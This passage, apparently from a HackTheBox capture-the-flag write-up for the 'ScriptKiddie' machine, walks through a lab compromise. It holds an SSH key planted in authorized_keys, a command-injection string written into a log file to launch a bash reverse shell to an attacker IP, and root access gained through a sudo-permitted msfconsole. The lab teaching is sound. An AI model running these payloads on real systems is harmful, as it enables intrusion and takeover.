<code>printf %s 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDGLndVd+2+y7FE7nVTrMtBvPiLNTMgObVw8s7d9B8n cyfun@penarch' >> /home/kid/.ssh/authorized_keys</code>.</p><p>There is another user named <code>pwn</code> owning a script: <code>/home/pwn/scanlosers.sh</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>=</span>/home/kid/logs/hackers
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>cd /home/pwn/
</span></span><span style=display:flex><span>cat $log | cut -d<span style=color:#e6db74>&#39; &#39;</span> -f3- | sort -u | <span style=color:#66d9ef>while</span> read ip; <span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>    sh -c <span style=color:#e6db74>&#34;nmap --top-ports 10 -oN recon/</span><span style=color:#e6db74>${</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>.nmap </span><span style=color:#e6db74>${</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74> 2&gt;&amp;1 &gt;/dev/null&#34;</span> &amp;
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> <span style=color:#66d9ef>$(</span>wc -l &lt; $log<span style=color:#66d9ef>)</span> -gt <span style=color:#ae81ff>0</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span> echo -n &gt; $log; <span style=color:#66d9ef>fi</span>
</span></span></code></pre></div><p>We have write access to <code>/home/kid/logs/hackers</code>. We can see that our date and
IP is written to this file when we try to bypass the searchploit function:</p><p><code>/home/kid/html/app.py</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> datetime
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> subprocess
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> tempfile
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, render_template, request
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> werkzeug.utils <span style=color:#f92672>import</span> secure_filename
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>regex_ip <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>compile(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.)</span><span style=color:#e6db74>{3}</span><span style=color:#e6db74>(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$&#39;</span>)
</span></span><span style=display:flex><span>regex_alphanum <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>compile(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;^[A-Za-z0-9 \.]+$&#39;</span>)
</span></span><span style=display:flex><span>OS_2_EXT <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;windows&#39;</span>: <span style=color:#e6db74>&#39;exe&#39;</span>, <span style=color:#e6db74>&#39;linux&#39;</span>: <span style=color:#e6db74>&#39;elf&#39;</span>, <span style=color:#e6db74>&#39;android&#39;</span>: <span style=color:#e6db74>&#39;apk&#39;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;GET&#39;</span>,<span style=color:#e6db74>&#39;POST&#39;</span>])
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>method <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;GET&#39;</span> <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> <span style=color:#e6db74>&#39;action&#39;</span> <span style=color:#f92672>in</span> request<span style=color:#f92672>.</span>form:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;action&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;scan&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> scan(request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;ip&#39;</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;action&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;generate&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> venom(request)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;action&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;searchsploit&#39;</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> searchsploit(request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;search&#39;</span>], request<span style=color:#f92672>.</span>remote_addr)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;no valid action&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> request<span style=color:#f92672>.</span>form
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>scan</span>(ip):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> regex_ip<span style=color:#f92672>.</span><span style=color:#66d9ef>match</span>(ip):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> ip <span style=color:#f92672>==</span> request<span style=color:#f92672>.</span>remote_addr <span style=color:#f92672>and</span> ip<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;10.10.1&#39;</span>) <span style=color:#f92672>and</span> <span style=color:#f92672>not</span> ip<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#39;10.10.10.&#39;</span>):
</span></span><span style=display:flex><span>            stime <span style=color:#f92672>=</span> random<span style=color:#f92672>.</span>randint(<span style=color:#ae81ff>200</span>,<span style=color:#ae81ff>400</span>)<span style=color:#f92672>/</span><span style=color:#ae81ff>100</span>
</span></span><span style=display:flex><span>            time<span style=color:#f92672>.</span>sleep(stime)
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&#34;&#34;Starting Nmap 7.80 ( https://nmap.org ) at </span><span style=color:#e6db74>{</span>datetime<span style=color:#f92672>.</span>datetime<span style=color:#f92672>.</span>utcnow()<span style=color:#f92672>.</span>strftime(<span style=color:#e6db74>&#34;%Y-%m-</span><span style=color:#e6db74>%d</span><span style=color:#e6db74> %H:%M&#34;</span>)<span style=color:#e6db74>}</span><span style=color:#e6db74> UTC</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Nmap done: 1 IP address (0 hosts up) scanned in </span><span style=color:#e6db74>{</span>stime<span style=color:#e6db74>}</span><span style=color:#e6db74> seconds&#34;&#34;&#34;</span><span style=color:#f92672>.</span>encode()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>check_output([<span style=color:#e6db74>&#39;nmap&#39;</span>, <span style=color:#e6db74>&#39;--top-ports&#39;</span>, <span style=color:#e6db74>&#39;100&#39;</span>, ip])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>, scan<span style=color:#f92672>=</span>result<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;UTF-8&#39;</span>, <span style=color:#e6db74>&#39;ignore&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>, scanerror<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;invalid ip&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>searchsploit</span>(text, srcip):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> regex_alphanum<span style=color:#f92672>.</span><span style=color:#66d9ef>match</span>(text):
</span></span><span style=display:flex><span>        result <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>check_output([<span style=color:#e6db74>&#39;searchsploit&#39;</span>, <span style=color:#e6db74>&#39;--color&#39;</span>, text])
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>, searchsploit<span style=color:#f92672>=</span>result<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;UTF-8&#39;</span>, <span style=color:#e6db74>&#39;ignore&#39;</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;/home/kid/logs/hackers&#39;</span>, <span style=color:#e6db74>&#39;a&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>            f<span style=color:#f92672>.</span>write(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[</span><span style=color:#e6db74>{</span>datetime<span style=color:#f92672>.</span>datetime<span style=color:#f92672>.</span>now()<span style=color:#e6db74>}</span><span style=color:#e6db74>] </span><span style=color:#e6db74>{</span>srcip<span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>, sserror<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stop hacking me - well hack you back&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>venom</span>(request):
</span></span><span style=display:flex><span>    errors <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    file <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> <span style=color:#e6db74>&#39;lhost&#39;</span> <span style=color:#f92672>in</span> request<span style=color:#f92672>.</span>form:
</span></span><span style=display:flex><span>        errors<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#39;lhost missing&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        lhost <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;lhost&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> regex_ip<span style=color:#f92672>.</span><span style=color:#66d9ef>match</span>(lhost):
</span></span><span style=display:flex><span>            errors<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#39;invalid lhost ip&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> <span style=color:#e6db74>&#39;os&#39;</span> <span style=color:#f92672>in</span> request<span style=color:#f92672>.</span>form:
</span></span><span style=display:flex><span>        errors<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#39;os missing&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        tar_os <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form[<span style=color:#e6db74>&#39;os&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> tar_os <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;windows&#39;</span>, <span style=color:#e6db74>&#39;linux&#39;</span>, <span style=color:#e6db74>&#39;android&#39;</span>]:
</span></span><span style=display:flex><span>            errors<span style=color:#f92672>.</span>append(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;invalid os: </span><span style=color:#e6db74>{</span>tar_os<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#39;template&#39;</span> <span style=color:#f92672>in</span> request<span style=color:#f92672>.</span>files <span style=color:#f92672>and</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#39;template&#39;</span>]<span style=color:#f92672>.</span>filename <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;&#39;</span>:
</span></span><span style=display:flex><span>        file <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>files[<span style=color:#e6db74>&#39;template&#39;</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> (<span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>in</span> file<span style=color:#f92672>.</span>filename <span style=color:#f92672>and</span> file<span style=color:#f92672>.</span>filename<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;.&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>==</span> OS_2_EXT[tar_os]):
</span></span><span style=display:flex><span>            errors<span style=color:#f92672>.</span>append(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>tar_os<span style=color:#e6db74>}</span><span style=color:#e6db74> requires a </span><span style=color:#e6db74>{</span>OS_2_EXT[tar_os]<span style=color:#e6db74>}</span><span style=color:#e6db74> ext template file&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            template_name <span style=color:#f92672>=</span> secure_filename(file<span style=color:#f92672>.</span>filename)
</span></span><span style=display:flex><span>            template_ext <span style=color:#f92672>=</span> file<span style=color:#f92672>.</span>filename<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;.&#39;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>            template_file <span style=color:#f92672>=</span> tempfile<span style=color:#f92672>.</span>NamedTemporaryFile(<span style=color:#e6db74>&#39;wb&#39;</span>, suffix<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;.&#39;</span><span style=color:#f92672>+</span>template_ext)
</span></span><span style=display:flex><span>            file<span style=color:#f92672>.</span>save(template_file<span style=color:#f92672>.</span>name)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        template_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;None&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> errors:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>, payloaderror<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&lt;br/&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join(errors))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>tar_os<span style=color:#e6db74>}</span><span style=color:#e6db74>/meterpreter/reverse_tcp&#39;</span>
</span></span><span style=display:flex><span>    outfilename <span style=color:#f92672>=</span> md5(request<span style=color:#f92672>.</span>remote_addr<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>hexdigest()[:<span style=color:#ae81ff>12</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>+</span> OS_2_EXT[tar_os]
</span></span><span style=display:flex><span>    outfilepath <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>join(app<span style=color:#f92672>.</span>root_path, <span style=color:#e6db74>&#39;static&#39;</span>, <span style=color:#e6db74>&#39;payloads&#39;</span>, outfilename)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> file:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;msfvenom -x </span><span style=color:#e6db74>{</span>template_file<span style=color:#f92672>.</span>name<span style=color:#e6db74>}</span><span style=color:#e6db74> -p </span><span style=color:#e6db74>{</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74> LHOST=</span><span style=color:#e6db74>{</span>lhost<span style=color:#e6db74>}</span><span style=color:#e6db74> LPORT=4444&#39;</span>)
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>check_output([<span style=color:#e6db74>&#39;msfvenom&#39;</span>, <span style=color:#e6db74>&#39;-x&#39;</span>, template_file<span style=color:#f92672>.</span>name, <span style=color:#e6db74>&#39;-p&#39;</span>,
</span></span><span style=display:flex><span>                payload, <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;LHOST=</span><span style=color:#e6db74>{</span>lhost<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;LPORT=4444&#39;</span>,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#39;-o&#39;</span>, outfilepath])
</span></span><span style=display:flex><span>            template_file<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            result <span style=color:#f92672>=</span> subprocess<span style=color:#f92672>.</span>check_output([<span style=color:#e6db74>&#39;msfvenom&#39;</span>, <span style=color:#e6db74>&#39;-p&#39;</span>, payload,
</span></span><span style=display:flex><span>                <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;LHOST=</span><span style=color:#e6db74>{</span>lhost<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#e6db74>&#39;LPORT=4444&#39;</span>, <span style=color:#e6db74>&#39;-o&#39;</span>, outfilepath])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> subprocess<span style=color:#f92672>.</span>CalledProcessError:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>, payloaderror<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Something went wrong&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>, payload<span style=color:#f92672>=</span>payload, lhost<span style=color:#f92672>=</span>lhost,
</span></span><span style=display:flex><span>            lport<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span>, template<span style=color:#f92672>=</span>template_name, fn<span style=color:#f92672>=</span>outfilename)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    app<span style=color:#f92672>.</span>run(host<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;0.0.0.0&#39;</span>)
</span></span></code></pre></div><p>So normally <code>/home/pwn/scanlosers.sh</code> will scan us back.</p><p>The logs file should contains lines like this one:</p><pre tabindex=0><code>2021-02-08 19:54:33.513581 1.1.1.1
</code></pre><p>And when we try to &ldquo;hack&rdquo; searchploit, it voids the file instead of appending a
new line.</p><p>There is <code>/usr/sbin/incrond</code> running so there is maybe a root job starting
<code>/home/pwn/scanlosers.sh</code> or something similar.</p><p>Let&rsquo;s upload and launch pspy to confirm that.</p><p>On our machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
</span></span><span style=display:flex><span>$ ruby -run -ehttpd . -p8080
</span></span></code></pre></div><p>On the target machine:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>kid@scriptkiddie:~$ wget http://10.10.14.135:8080/pspy64
</span></span><span style=display:flex><span>kid@scriptkiddie:~$ chmod u+x pspy64
</span></span><span style=display:flex><span>kid@scriptkiddie:~$ ./pspy64
</span></span></code></pre></div><p>If we go trigger the searchsploit security filter we can see this on pspy:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=1001 PID=2221   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=1001 PID=2225   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=1001 PID=2226   | sh -c nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 2&gt;&amp;1 &gt;/dev/null 
</span></span><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=1001 PID=2228   | nmap --top-ports 10 -oN recon/10.10.14.135.nmap 10.10.14.135 
</span></span><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=1001 PID=2231   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=1001 PID=2237   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=1001 PID=2236   | /bin/bash /home/pwn/scanlosers.sh 
</span></span><span style=display:flex><span>2021/02/08 21:30:37 CMD: UID=0    PID=2238   | /lib/systemd/systemd-udevd 
</span></span><span style=display:flex><span>2021/02/08 21:30:48 CMD: UID=0    PID=2239   | /usr/sbin/incrond 
</span></span><span style=display:flex><span>2021/02/08 21:30:48 CMD: UID=1001 PID=2240   | sed -i s/open  /closed/g /home/pwn/recon/sed6xfScv 
</span></span><span style=display:flex><span>2021/02/08 21:30:48 CMD: UID=0    PID=2241   | /bin/sh /sbin/dhclient-script 
</span></span><span style=display:flex><span>2021/02/08 21:30:48 CMD: UID=???  PID=2243   | ???
</span></span></code></pre></div><p>1001 is the id of <code>pwn</code>, so we&rsquo;ll get a shell as pwn.</p><p>Let&rsquo;s craft a reverse shell payload and put it in place:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>$ printf %s &#34;cyfun cyfun ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.135/9999 0&gt;&amp;1&#39; #&#34; &gt; /home/kid/logs/hackers
</span></span></code></pre></div><p>Note: respect the log format else the <code>cut</code> in the script will fails to parse</p><p>Once injected in <code>/home/pwn/scanlosers.sh</code> the command executed by pwn incron
job will be:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>nmap --top-ports 10 -oN recon/ ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.135/9999 0&gt;&amp;1&#39; #.nmap  ;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.135/9999 0&gt;&amp;1&#39; # 2&gt;&amp;1 &gt;/dev/null
</span></span></code></pre></div><p>Then we start a listener <code>pwncat -l 9999 -vv</code>.</p><h2 id=privilege-escalation-of-machine--from-pwn-to-root>Privilege Escalation of Machine : from pwn to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine--from-pwn-to-root>#</a></h2><p>We can root <code>msfconsole</code> as root.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>pwn@scriptkiddie:~$ sudo -l
</span></span><span style=display:flex><span>Matching Defaults entries for pwn on scriptkiddie:
</span></span><span style=display:flex><span>    env_reset, mail_badpass,
</span></span><span style=display:flex><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User pwn may run the following commands on scriptkiddie:
</span></span><span style=display:flex><span>    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
</span></span></code></pre></div><p>It will be EZ because we it&rsquo;s an interpretter where we can directly pass
system commands or open <code>irb</code> ruby interpreter.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext><span style=display:flex><span>msf6 &gt; cat /root/root.txt
</span></span><span style=display:flex><span>stty: &#39;standard input&#39;: Inappropriate ioctl for device
</span></span><span style=display:flex><span>[*] exec: cat /root/root.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>40aa*********************75f
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/easy/>Easy</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>